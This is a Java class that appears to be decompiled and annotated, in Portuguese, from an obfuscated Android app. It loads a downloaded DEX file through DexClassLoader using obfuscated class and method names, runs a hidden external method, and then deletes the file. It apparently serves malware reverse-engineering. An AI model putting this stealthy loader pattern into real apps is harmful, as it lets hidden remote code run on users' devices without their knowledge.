package defpackage;

import java.io.File;
import java.lang.reflect.Constructor;

/**
 * DexExecutor - Classe responsável pelo carregamento e execução do DEX externo
 * Extraída de: C2367wE.java (originalmente obfuscada)
 * 
 * Esta classe implementa o segundo passo do Dynamic Code Loading (DCL):
 * carrega o DEX baixado usando DexClassLoader e executa métodos da classe externa.
 */
public final class DexExecutor extends F30 implements InterfaceC2641zv {
    public final /* synthetic */ HE context;
    public final /* synthetic */ String dexFilePath;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public DexExecutor(HE he, String str, InterfaceC1945qi interfaceC1945qi) {
        super(2, interfaceC1945qi);
        this.context = he;
        this.dexFilePath = str;
    }

    @Override // defpackage.InterfaceC2641zv
    public final Object k(Object obj, Object obj2) {
        return ((DexExecutor) p((InterfaceC1945qi) obj2, (InterfaceC1490kj) obj)).executeDex(C0997e90.a);
    }

    @Override // defpackage.AbstractC1178gb
    public final InterfaceC1945qi p(InterfaceC1945qi interfaceC1945qi, Object obj) {
        return new DexExecutor(this.context, this.dexFilePath, interfaceC1945qi);
    }

    /**
     * executeDex - Carrega e executa o DEX externo
     * Originalmente: r(Object obj)
     * 
     * Processo:
     * 1. Decodifica nome da classe DexClassLoader usando StringObfuscator.getObfuscatedString('A')
     * 2. Cria instância do DexClassLoader
     * 3. Decodifica nome da classe externa usando StringObfuscator.getObfuscatedString('C')
     * 4. Carrega a classe externa usando DexClassLoader
     * 5. Decodifica nome do método usando StringObfuscator.getMethodName(2)
     * 6. Executa o método da classe externa
     * 7. Remove o arquivo DEX após execução
     */
    @Override // defpackage.AbstractC1178gb
    public final Object executeDex(Object obj) throws Throwable {
        String dexPath = this.dexFilePath;
        HE context = this.context;
        AbstractC1377jB.O(obj);
        try {
            // Decodifica nome da classe DexClassLoader
            String dexClassLoaderName = StringObfuscator.getObfuscatedString('A');
            Constructor<?> constructor = Class.forName(dexClassLoaderName)
                .getConstructor(String.class, String.class, String.class, ClassLoader.class);
            
            // Cria diretório de otimização para o DEX
            File optimizationDir = new File(context.e.getCacheDir(), "dex");
            if (!optimizationDir.exists()) {
                optimizationDir.mkdirs();
            }
            
            // Cria instância do DexClassLoader
            Object dexClassLoader = constructor.newInstance(
                dexPath, 
                optimizationDir.getAbsolutePath(), 
                null, 
                context.e.getClassLoader()
            );
            
            // Decodifica nome da classe externa a ser carregada
            String externalClassName = StringObfuscator.getObfuscatedString('C');
            
            // Carrega a classe externa usando DexClassLoader
            Class<?> externalClass = (Class<?>) dexClassLoader.getClass()
                .getMethod(StringObfuscator.getMethodName(0), String.class)
                .invoke(dexClassLoader, externalClassName);
            
            // Decodifica nome do método a ser executado
            String methodName = StringObfuscator.getMethodName(2);
            
            // Executa o método da classe externa
            externalClass.getMethod(methodName, null)
                .invoke(externalClass.newInstance(), null);
            
            // Remove o arquivo DEX após execução
            return Boolean.valueOf(new File(dexPath).delete());
        } catch (Exception unused) {
            return C0997e90.a;
        }
    }
}
